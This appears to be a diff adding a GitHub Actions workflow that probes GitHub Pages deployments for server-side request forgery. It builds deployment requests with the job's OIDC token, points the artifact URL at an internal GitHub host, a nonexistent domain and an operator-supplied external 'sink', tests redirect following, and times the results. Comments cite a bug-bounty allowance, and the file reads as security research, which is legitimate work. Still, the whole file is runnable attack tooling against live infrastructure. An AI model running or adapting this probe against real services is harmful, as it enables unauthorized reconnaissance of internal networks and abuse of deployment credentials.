@@ -1,0 +1,68 @@
+name: reacharm8
+on:
+  workflow_dispatch:
+    inputs:
+      sink: { required: true }
+permissions: { contents: write, pages: write, id-token: write, actions: write }
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      - run: mkdir -p s && echo '<h1>ok</h1>' > s/index.html && tar -czf art.tar.gz -C s .
+      - uses: actions/upload-artifact@v4
+        with: { name: e1, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: e2, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: e3, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: e4, path: art.tar.gz }
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SINK: ${{ inputs.sink }}
+        run: |
+          set -u
+          R=$GITHUB_REPOSITORY; A=https://api.github.com
+          API="$A/repos/$R/pages/deployments"
+          H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
+          echo "PRECONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-PRE8")"
+          curl -s "${H[@]}" "$A/repos/$R/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
+          gid(){ jq -r --arg n "$1" '.artifacts[]|select(.name==$n).id' arts.json; }
+          mk(){ curl -s "${H[@]}" -X PUT "$A/repos/$R/contents/m8/$1-$RANDOM.txt" \
+                 -d "$(jq -nc --arg m "m $1" --arg c "$(echo -n "$1-$GITHUB_RUN_ID-$RANDOM"|base64 -w0)" '{message:$m,content:$c}')" \
+                 | jq -r '.commit.sha'; }
+          arm(){ # $1=label $2=artifact $3=url
+            echo "===== $1  url=$3 ====="
+            for try in 1 2 3 4 5 6 7 8; do
+              TK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+              jq -nc --argjson id "$(gid $2)" --arg u "$3" --arg s "$(mk $1)" --arg t "$TK" \
+                '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > x.json
+              ST=$(date +%s)
+              C=$(curl -s -o x.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @x.json)
+              [ "$C" = "200" ] && break
+              echo "$1 POST=$C try=$try :: $(jq -r '.message//"?"' x.out | head -c 70)"; sleep 25
+            done
+            [ "$C" != "200" ] && { echo "$1 RESULT=NOT_DISPATCHED"; return; }
+            echo "$1 POST=200 DEPLOY=$(jq -r '.id' x.out)"
+            SU=$(jq -r '.status_url//empty' x.out)
+            for i in $(seq 1 75); do sleep 2
+              S=$(curl -s "${H[@]}" "$SU" | jq -r '.status')
+              case "$S" in deployment_in_progress|deployment_queued|null|"") ;;
+                *) echo "$1 RESULT=$S SECONDS=$(( $(date +%s) - ST ))"; return;; esac
+            done; echo "$1 RESULT=OVER150 SECONDS=$(( $(date +%s) - ST ))"; }
+
+          # NEGATIVE ANCHOR
+          arm NXDOM  e1 "https://zzq-nope-0917-does-not-exist.invalid/zzq"
+          # *** VENDOR-SANCTIONED POSITIVE INTERNAL ANCHOR ***
+          # bounty.github.com/targets/github-net.html: "You may use ssrf-target.iad.github.net
+          # to test out SSRF attacks."  This is the arm my previous batch lacked: without a target
+          # KNOWN reachable by design, a null on a guessed internal host is silence, not evidence.
+          arm CANARY e2 "https://ssrf-target.iad.github.net/zzq-reacharm-0917-probe"
+          # 302 ARM: processor/downloader carries NO withoutRedirects symbol while four sibling
+          # packages in the same image DO. Does the artifact downloader follow redirects?
+          arm REDIR  e3 "$SINK/REDIR-SRC-ARM"
+          # POSITIVE EXTERNAL ANCHOR / END-OF-RUN RIG PROOF
+          arm ENDSERVE e4 "$SINK/CAL-SERVE8-END"
+          echo "POSTCONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-POST8")"
